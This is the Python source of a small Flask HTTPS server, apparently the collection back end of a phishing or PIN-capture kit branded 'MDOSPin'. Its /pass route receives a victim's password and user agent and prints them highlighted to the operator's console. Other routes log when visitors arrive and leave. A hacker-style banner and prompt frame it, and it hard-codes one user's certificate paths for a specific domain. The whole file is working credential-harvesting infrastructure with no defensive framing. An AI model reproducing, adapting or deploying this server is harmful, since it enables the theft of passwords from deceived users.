from flask import Flask, request
from flask_restful import Resource, Api
from json import dumps
from flask_jsonpify import jsonify
from OpenSSL import SSL
import re, os

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def welcome():
	print("""\033[91m
*     *  *****    ***    ***   ****                  
**   **   *   *  *   *  *   *  *   *    *            
* * * *   *   *  *   *  *      *   *                 
*  *  *   *   *  *   *  *      *   *   **    * ***   
*     *   *   *  *   *   ***   ****     *    **   *  
*     *   *   *  *   *      *  *        *    *    *  
*     *   *   *  *   *      *  *        *    *    *  
*     *   *   *  *   *  *   *  *        *    *    *  
*     *  *****    ***    ***   *      *****  *    *  
\033[0m""")

	print("Server running on", f"{bcolors.FAIL}0.0.0.0:8070{bcolors.ENDC}")
	print("")
	print("\033[1m\033[92m[festus8070@Unknown\033[0m \033[1m\033[91mMDOSPin\033[0m\033[1m\033[92m]$\033[0m","Waiting for a Connection...")

import sys
cli = sys.modules['flask.cli']
cli.show_server_banner = lambda *x: None

app = Flask(__name__)
api = Api(app)

import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

class newpass(Resource):
    def get(self, passwd, useragent):
        print("\033[1m\033[92m[festus8070@Unknown\033[0m \033[1m\033[91mMDOSPin\033[0m\033[1m\033[92m]$\033[0m","NEW PASSWORD:","\033[1m\033[4m\033[91m",passwd,"\033[0m","FROM:\033[1m\033[4m\033[91m",useragent,"\033[0m")
        return   

class newuser(Resource):
    def get(self, useragent):
        print("\033[1m\033[92m[festus8070@Unknown\033[0m \033[1m\033[91mMDOSPin\033[0m\033[1m\033[92m]$\033[0m","NEW USER:","\033[1m\033[4m\033[91m",useragent,"\033[0m")
        return 

class left(Resource):
    def get(self, useragent):
        print("\033[1m\033[92m[festus8070@Unknown\033[0m \033[1m\033[91mMDOSPin\033[0m\033[1m\033[92m]$\033[0m","USER HAS LEFT:","\033[1m\033[4m\033[91m",useragent,"\033[0m")
        return        

api.add_resource(left, '/left/<useragent>') # Route_1
api.add_resource(newuser, '/new/<useragent>') # Route_2
api.add_resource(newpass, '/pass/<useragent>/<passwd>') # Route_3


if __name__ == '__main__':
     welcome()
     #context = ('/home/bastyoung/ssl/certs/theyoungappy_com_d08e0_f56b3_1613692799_11cd38451d3fe9f23712d2495e309bd3.crt','/home/bastyoung/ssl/keys/d08e0_f56b3_ddd78e6d467b8f064151159bda3d2d68.key')
     _crt = os.popen("ls /home/bastyoung/ssl/certs/theyoungappy_com_*.crt -t | head -n 1").read().strip()
     x = "/home/bastyoung/ssl/keys/"+str(re.findall("\/home\/bastyoung\/ssl\/certs\/theyoungappy_com_(.*?_.*?)_.*?.crt", _crt)[0])+"_*.key"
     _key = os.popen("ls "+x).read().strip()
     print("Using:\n",_crt,"\n",_key,"\n")
     context = (_crt,_key)
     app.run(ssl_context=context,port='8070',host='0.0.0.0')
